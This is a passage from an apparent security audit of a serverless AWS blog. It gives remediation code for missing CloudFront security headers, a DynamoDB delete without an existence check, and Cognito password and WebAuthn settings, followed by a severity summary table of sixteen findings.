**Location:** `infra/cloudfront.tf` — all cache behaviors

**Vector:** The CloudFront distribution returns no security headers:
no `Content-Security-Policy`, no `X-Frame-Options`, no `X-Content-Type-Options`,
no `Strict-Transport-Security`, no `Referrer-Policy`. Without CSP, the XSS mitigations in
SEC-03 are the only line of defence against script injection. Without `X-Frame-Options` /
`frame-ancestors`, the site can be embedded in a malicious iframe for clickjacking.

**Fix:** Add a CloudFront Response Headers Policy:

```hcl
# infra/cloudfront.tf
resource "aws_cloudfront_response_headers_policy" "security" {
  name = "oldforest-security-headers"

  security_headers_config {
    content_type_options { override = true }   # X-Content-Type-Options: nosniff
    frame_options {
      frame_option = "DENY"
      override     = true
    }
    referrer_policy {
      referrer_policy = "strict-origin-when-cross-origin"
      override        = true
    }
    strict_transport_security {
      access_control_max_age_sec = 31536000
      include_subdomains         = true
      override                   = true
    }
    content_security_policy {
      content_security_policy = "default-src 'self'; script-src 'self' https://cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline'; img-src 'self' https: data:; connect-src 'self' https://*.amazonaws.com https://openlibrary.org https://www.googleapis.com; frame-ancestors 'none';"
      override                = true
    }
  }
}

# Apply to the default cache behavior in aws_cloudfront_distribution.main:
# response_headers_policy_id = aws_cloudfront_response_headers_policy.security.id
```

Note: The CSP `script-src` must include `cdnjs.cloudflare.com` since `marked` and (after
SEC-03 fix) `DOMPurify` are loaded from there.

- [x] **[SEC-13]** Add CloudFront Response Headers Policy with CSP, HSTS, X-Frame-Options

---

### SEC-14 — `deleteRead` has no existence check (blind 200 on missing records)

**Location:** `src/functions/reading-log/index.mjs` — `deleteRead()` function

**Vector:** `deleteRead` issues a `DeleteCommand` unconditionally. Deleting a non-existent
`readId` succeeds silently with HTTP 200 and `{ deleted: readId }`. This is functionally
harmless on a single-user blog but represents a misleading API contract — callers cannot
distinguish a successful delete from a delete against an ID that never existed. It also means
any valid editor can probe for readId existence by issuing deletes and observing that the
response is always 200.

```js
// CURRENT — no condition, no existence check
async function deleteRead(event) {
  if (!isEditor(event)) return err('Forbidden', 403);
  const { readId } = event.pathParameters;
  await dynamo.send(new DeleteCommand({ TableName: READS_TABLE, Key: { readId } }));
  return ok({ deleted: readId });
}
```

**Fix:** Add a `ConditionExpression` (avoids an extra round-trip):

```js
async function deleteRead(event) {
  if (!isEditor(event)) return err('Forbidden', 403);
  const { readId } = event.pathParameters;
  try {
    await dynamo.send(new DeleteCommand({
      TableName: READS_TABLE,
      Key: { readId },
      ConditionExpression: 'attribute_exists(readId)',
    }));
  } catch (e) {
    if (e.name === 'ConditionalCheckFailedException') return err('Read not found', 404);
    throw e;
  }
  return ok({ deleted: readId });
}
```

- [x] **[SEC-14]** Add ConditionExpression to deleteRead to return 404 on missing record

---

### SEC-15 — Cognito password policy does not require symbols

**Location:** `infra/cognito.tf:10`

**Vector:** The policy requires 12 characters with upper, lower, and digits, but
`require_symbols = false`. A 12-character alphanumeric password has ~72 bits of entropy — not
weak, but the absence of symbols reduces the keyspace marginally. More importantly, passkeys
(WebAuthn) are configured on this pool, so passwords are increasingly a fallback, not the
primary path. Enabling symbols costs users nothing meaningful.

```hcl
# CURRENT
require_symbols = false

# FIX
require_symbols = true
```

- [x] **[SEC-15]** Set `require_symbols = true` in Cognito password policy

---

### SEC-16 — WebAuthn `user_verification = "preferred"` (should be `"required"`)

**Location:** `infra/cognito.tf:16`

**Vector:** `"preferred"` allows passkey authentication without UV (user verification —
biometric or PIN). On a shared device or borrowed authenticator, this means a passkey holder
can authenticate to the blog admin without proving presence via biometric. Since this is an
admin-capable pool, `"required"` is appropriate.

```hcl
# CURRENT
user_verification = "preferred"

# FIX
user_verification = "required"
```

- [x] **[SEC-16]** Set WebAuthn `user_verification = "required"` in Cognito pool

---

## Summary Table

| ID | Severity | Location | Subject |
|----|----------|----------|---------|
| SEC-01 | CRITICAL | `infra/lambdas.tf` | API key hardcoded in Terraform source |
| SEC-02 | CRITICAL | `admin-users`, `admin-files`, `admin-apps` | `requireAdmin` substring match — privilege escalation |
| SEC-03 | CRITICAL | `site/post.html:205` | Stored XSS via unmarked → innerHTML (no DOMPurify) |
| SEC-04 | CRITICAL | `upload-url/index.mjs:45` | Caller-controlled ContentType enables HTML smuggling |
| SEC-05 | HIGH | `infra/api.tf` | No API throttling or WAF — DynamoDB Scan cost amplification |
| SEC-06 | HIGH | `update-post/index.mjs` | Missing existence check — silent upsert on unknown postId |
| SEC-07 | HIGH | `lt-proxy/index.mjs:58` | API key logged in full URL to CloudWatch |
| SEC-08 | HIGH | All Lambdas — catch blocks | Internal `e.message` exposed in 500 responses |
| SEC-09 | MEDIUM | `admin-users`, `admin-files`, `admin-apps` | CORS wildcard `*` on admin endpoints |
| SEC-10 | MEDIUM | `infra/cognito.tf` | Access token validity set to 24 hours (Cognito max) |
| SEC-11 | MEDIUM | `upload-url/index.mjs` | No upload size constraint on presigned URL |
| SEC-12 | MEDIUM | `get-post/index.mjs` | `authorSub` + `contentKey` returned to public callers |
| SEC-13 | LOW | `infra/cloudfront.tf` | No security response headers (CSP, HSTS, X-Frame-Options) |
| SEC-14 | LOW | `reading-log/index.mjs` | `deleteRead` blind 200 on missing record |
| SEC-15 | LOW | `infra/cognito.tf` | Password policy does not require symbols |
| SEC-16 | LOW | `infra/cognito.tf` | WebAuthn `user_verification = "preferred"` |
